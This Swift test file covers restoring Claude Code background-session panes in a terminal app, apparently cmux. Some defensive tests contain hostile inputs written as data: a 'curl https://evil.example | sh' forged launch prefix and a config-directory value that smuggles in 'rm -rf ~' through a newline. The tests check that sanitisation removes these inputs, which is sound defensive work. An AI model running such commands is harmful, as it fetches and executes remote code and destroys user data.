import Foundation
import Testing
@testable import CMUXAgentLaunch

/// A pane viewing a Claude Code background session (`claude attach <id>`, hosted
/// by `claude bg-pty-host`/`bg-spare`) must come back attached after a cmux
/// relaunch, never as `claude --resume` against the daemon's live session.
@Suite struct ClaudeBackgroundSessionAttachTests {
    private let sessionID = "884a7be7-5a7c-4d54-838e-423426a31aaf"
    private let configDirectory = "/Users/me/.subrouter/codex/claude-proxy/57b56e777c601cff139b0e2b"
    private let executable = "/Users/me/.local/bin/claude"

    private var registration: ClaudeBackgroundSessionRegistration {
        ClaudeBackgroundSessionRegistration(
            processID: 77733,
            sessionID: sessionID,
            jobID: "884a7be7",
            name: "Recent cmux sessions recap"
        )
    }

    private var routedEnvironment: [String: String] {
        [
            "ANTHROPIC_BASE_URL": "http://127.0.0.1:31415",
            "CLAUDE_CONFIG_DIR": configDirectory,
            "CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV": "1",
            "CMUX_PRESERVE_CLAUDE_AUTH_SELECTION_ENV_KEYS": "ANTHROPIC_BASE_URL,CLAUDE_CONFIG_DIR",
        ]
    }

    private func attach(
        daemonHosts: ClaudeBackgroundSessionRegistration?,
        expectedConfigDirectory: String? = nil
    ) -> ClaudeBackgroundSessionAttach {
        let expected = expectedConfigDirectory ?? configDirectory
        return ClaudeBackgroundSessionAttach(homeDirectory: "/Users/me") { directory, reference in
            guard directory == expected, let daemonHosts else { return nil }
            let matches = reference == daemonHosts.sessionID
                || reference == daemonHosts.jobID
                || reference == daemonHosts.name
            return matches ? daemonHosts : nil
        }
    }

    @Test func attachViewerProcessIsRecognizedWithItsDaemonEnvironment() throws {
        let viewer = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: [executable, "attach", "884a7be7"],
            environment: routedEnvironment.merging([
                "ANTHROPIC_AUTH_TOKEN": "secret",
                "PATH": "/usr/bin",
            ]) { current, _ in current }
        ))

        #expect(viewer.reference == "884a7be7")
        #expect(viewer.launchArguments == [executable])
        #expect(viewer.environment == routedEnvironment)
    }

    @Test(arguments: [
        ["/Users/me/.local/bin/claude"],
        ["/Users/me/.local/bin/claude", "--resume", "884a7be7"],
        ["/Users/me/.local/bin/claude", "attach"],
        ["/Users/me/.local/bin/claude", "agents", "attach"],
        ["/usr/bin/tmux", "attach", "-t", "main"],
    ])
    func nonViewerProcessesAreNotBackgroundViewers(arguments: [String]) {
        #expect(ClaudeBackgroundSessionAttach.viewer(arguments: arguments, environment: [:]) == nil)
    }

    @Test func attachPaneSnapshotRestoresAsAttachWithTheBindingEnvironment() throws {
        let viewer = ClaudeBackgroundSessionViewer(
            reference: "884a7be7",
            launchArguments: [executable],
            environment: ["CLAUDE_CONFIG_DIR": configDirectory]
        )
        let hookSession = ClaudeBackgroundSessionAttach.HookSession(
            sessionID: sessionID,
            launchArguments: [executable],
            launcher: "claude",
            environment: routedEnvironment
        )

        let plan = try #require(attach(daemonHosts: registration).plan(viewer: viewer, hookSession: hookSession))

        #expect(plan.arguments == [executable, "attach", "884a7be7"])
        #expect(plan.environment == routedEnvironment)
        #expect(!plan.arguments.contains("--resume"))
    }

    @Test func daemonOwnedHookSessionRestoresAsAttachWithoutAViewerProcess() throws {
        let hookSession = ClaudeBackgroundSessionAttach.HookSession(
            sessionID: sessionID,
            launchArguments: [executable],
            launcher: "claude",
            environment: routedEnvironment
        )

        let plan = try #require(attach(daemonHosts: registration).plan(viewer: nil, hookSession: hookSession))

        #expect(plan.arguments == [executable, "attach", "884a7be7"])
        #expect(plan.environment == routedEnvironment)
        #expect(plan.registration.processID == 77733)
    }

    @Test func interactiveClaudeSessionIsLeftToItsResumeRestore() {
        // The daemon lists no background session for an interactive Claude, so
        // the caller keeps the existing `--resume` restore unchanged.
        let hookSession = ClaudeBackgroundSessionAttach.HookSession(
            sessionID: "d5c9e5b8-67f7-4e96-a8ce-1c886b77fb2f",
            launchArguments: [executable],
            launcher: "claude",
            environment: routedEnvironment
        )

        #expect(attach(daemonHosts: registration).plan(viewer: nil, hookSession: hookSession) == nil)
    }

    @Test func daemonGoneFallsBackToTheExistingManualRestore() {
        let viewer = ClaudeBackgroundSessionViewer(
            reference: "884a7be7",
            launchArguments: [executable],
            environment: ["CLAUDE_CONFIG_DIR": configDirectory]
        )
        let hookSession = ClaudeBackgroundSessionAttach.HookSession(
            sessionID: sessionID,
            launchArguments: [executable],
            launcher: "claude",
            environment: routedEnvironment
        )

        #expect(attach(daemonHosts: nil).plan(viewer: viewer, hookSession: hookSession) == nil)
    }

    @Test func defaultConfigDirectoryIsHomeClaude() throws {
        let hookSession = ClaudeBackgroundSessionAttach.HookSession(
            sessionID: sessionID,
            launchArguments: [],
            launcher: "sr",
            environment: [:]
        )

        let plan = try #require(
            attach(daemonHosts: registration, expectedConfigDirectory: "/Users/me/.claude")
                .plan(viewer: nil, hookSession: hookSession)
        )

        #expect(plan.arguments == ["sr", "claude", "attach", "884a7be7"])
        #expect(plan.environment.isEmpty)
    }

    @Test func registryListsOnlyLiveBackgroundSessions() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-claude-bg-registry-\(UUID().uuidString)", isDirectory: true)
        let sessions = root.appendingPathComponent("sessions", isDirectory: true)
        try FileManager.default.createDirectory(at: sessions, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        func write(_ name: String, _ object: [String: Any]) throws {
            try JSONSerialization.data(withJSONObject: object)
                .write(to: sessions.appendingPathComponent(name))
        }
        try write("77733.json", [
            "pid": 77733, "sessionId": sessionID, "kind": "bg",
            "jobId": "884a7be7", "name": "Recent cmux sessions recap",
        ])
        try write("54634.json", [
            "pid": 54634, "sessionId": "d5c9e5b8-67f7-4e96-a8ce-1c886b77fb2f", "kind": "interactive",
        ])
        try write("90001.json", [
            "pid": 90001, "sessionId": "0b1c2d3e-0000-4000-8000-000000000001", "kind": "bg",
        ])
        try "not json".write(to: sessions.appendingPathComponent("broken.json"), atomically: true, encoding: .utf8)

        let registry = ClaudeBackgroundSessionRegistry(
            configDirectory: root.path,
            processMatchesRecord: { $0.processID == 77733 || $0.processID == 54634 }
        )

        #expect(registry.liveBackgroundSession(matching: "884a7be7") == registration)
        #expect(registry.liveBackgroundSession(matching: sessionID) == registration)
        #expect(registry.liveBackgroundSession(matching: "Recent cmux sessions recap") == registration)
        #expect(registry.liveBackgroundSession(matching: "884a7be7-5a7c") == registration)
        #expect(registry.liveBackgroundSession(matching: "d5c9e5b8-67f7-4e96-a8ce-1c886b77fb2f") == nil)
        #expect(registry.liveBackgroundSession(matching: "0b1c2d3e-0000-4000-8000-000000000001") == nil)
        #expect(ClaudeBackgroundSessionRegistry(configDirectory: root.appendingPathComponent("missing").path)
            .liveBackgroundSession(matching: "884a7be7") == nil)
    }

    // MARK: - Review fixes (#18599)

    @Test func viewerLaunchArgumentsKeepOnlyTheClaudeExecutable() throws {
        let viaEnv = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: ["/usr/bin/env", executable, "attach", "884a7be7"],
            environment: [:]
        ))
        #expect(viaEnv.launchArguments == ["/usr/bin/env", executable])

        let wrapped = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: ["/usr/bin/nice", "-n", "5", executable, "attach", "884a7be7"],
            environment: [:]
        ))
        #expect(wrapped.launchArguments == [executable])

        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["/bin/sh", "-c", "curl evil | sh", "claude"])
            == ["claude"])
        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["relative/claude"]) == ["claude"])
        #expect(ClaudeBackgroundSessionAttach.sanitizedViewerLaunchArguments(["env", "claude"]) == ["env", "claude"])
    }

    @Test func forgedViewerPrefixNeverReachesTheAttachCommand() throws {
        let forged = ClaudeBackgroundSessionViewer(
            reference: "884a7be7",
            launchArguments: ["/bin/sh", "-c", "curl https://evil.example | sh", "claude"],
            environment: ["CLAUDE_CONFIG_DIR": configDirectory]
        )

        let plan = try #require(attach(daemonHosts: registration).plan(viewer: forged, hookSession: nil))

        #expect(plan.arguments == ["claude", "attach", "884a7be7"])
    }

    @Test func attachOptionsDoNotBecomeTheTarget() throws {
        let viewer = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: [executable, "attach", "--flag", "value", "884a7be7"],
            environment: [:]
        ))
        #expect(viewer.reference == "884a7be7")
        let trailingOptions = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: [executable, "attach", "884a7be7", "--flag", "value"],
            environment: [:]
        ))
        #expect(trailingOptions.reference == "884a7be7")
        let inlineOption = try #require(ClaudeBackgroundSessionAttach.viewer(
            arguments: [executable, "attach", "--flag=value", "884a7be7"],
            environment: [:]
        ))
        #expect(inlineOption.reference == "884a7be7")
        #expect(ClaudeBackgroundSessionAttach.viewer(arguments: [executable, "attach", "one", "two"], environment: [:]) == nil)
    }

    @Test func controlCharactersNeverReachTheTypedCommand() throws {
        #expect(ClaudeBackgroundSessionAttach.attachEnvironment([
            "CLAUDE_CONFIG_DIR": "/tmp/x\nrm -rf ~",
            "ANTHROPIC_BASE_URL": "http://127.0.0.1:31415",
        ]) == ["ANTHROPIC_BASE_URL": "http://127.0.0.1:31415"])

        let root = try registryRoot()
        defer { try? FileManager.default.removeItem(at: root.root) }
        try root.write("77733.json", [
            "pid": 77733, "sessionId": sessionID, "kind": "bg",
            "jobId": "884a\u{1B}]0;x\u{07}", "name": "bad\nname",
        ])
        try root.write("90002.json", [
            "pid": 90002, "sessionId": "0b1c2d3e\n-evil", "kind": "bg", "jobId": "0b1c2d3e",
        ])
        let registry = ClaudeBackgroundSessionRegistry(configDirectory: root.root.path, processMatchesRecord: { _ in true })

        let match = try #require(registry.liveBackgroundSession(matching: sessionID))
        #expect(match.jobID == nil)
        #expect(match.name == nil)
        #expect(match.attachTarget == sessionID)
        #expect(registry.liveBackgroundSession(matching: "0b1c2d3e") == nil)
    }

    @Test func reusedPIDDoesNotMakeAStaleRecordLive() throws {
        let started = try #require(ClaudeBackgroundSessionRegistry.processStartSeconds(Int(getpid())))
        let current = ClaudeBackgroundSessionRegistration(
            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
            processStart: ClaudeBackgroundSessionRegistry.formatProcStart(started), pidDomain: "darwin"
        )
        let stale = ClaudeBackgroundSessionRegistration(
            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
            processStart: "Mon Jan  1 00:00:00 2001", pidDomain: "darwin"
        )
        let foreignDomain = ClaudeBackgroundSessionRegistration(
            processID: Int(getpid()), sessionID: sessionID, jobID: nil, name: nil,
            processStart: ClaudeBackgroundSessionRegistry.formatProcStart(started), pidDomain: "linux"
        )
        // No start time recorded: the process must at least be Claude. This
        // test runner is not, and neither is launchd (pid 1).
        let unverifiable = ClaudeBackgroundSessionRegistration(
            processID: 1, sessionID: sessionID, jobID: nil, name: nil
        )

        #expect(ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(current))
        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(stale))
        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(foreignDomain))
        #expect(!ClaudeBackgroundSessionRegistry.recordMatchesLiveProcess(unverifiable))
        #expect(ClaudeBackgroundSessionRegistry.parseProcStart("Sat Oct  3 18:52:39 2026") == 1_791_053_559)
        #expect(ClaudeBackgroundSessionRegistry.formatProcStart(1_791_053_559) == "Sat Oct  3 18:52:39 2026")
    }

    @Test func registryScanIsMemoizedPerConfigDirectory() {
        final class Counter: @unchecked Sendable {
            let lock = NSLock()
            var scans: [String] = []
        }
        let counter = Counter()
        let lookup = ClaudeBackgroundSessionAttach.memoizedRegistryLookup { [registration] directory in
            counter.lock.lock(); counter.scans.append(directory); counter.lock.unlock()
            return directory == "/a" ? [registration] : []
        }

        #expect(lookup("/a", "884a7be7") == registration)
        #expect(lookup("/a", sessionID) == registration)
        #expect(lookup("/b", "884a7be7") == nil)
        #expect(lookup("/b", sessionID) == nil)
        #expect(counter.scans == ["/a", "/b"])
    }

    private struct RegistryRoot {
        let root: URL
        func write(_ name: String, _ object: [String: Any]) throws {
            try JSONSerialization.data(withJSONObject: object)
                .write(to: root.appendingPathComponent("sessions").appendingPathComponent(name))
        }
    }

    private func registryRoot() throws -> RegistryRoot {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("cmux-claude-bg-registry-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(
            at: root.appendingPathComponent("sessions"), withIntermediateDirectories: true
        )
        return RegistryRoot(root: root)
    }
}
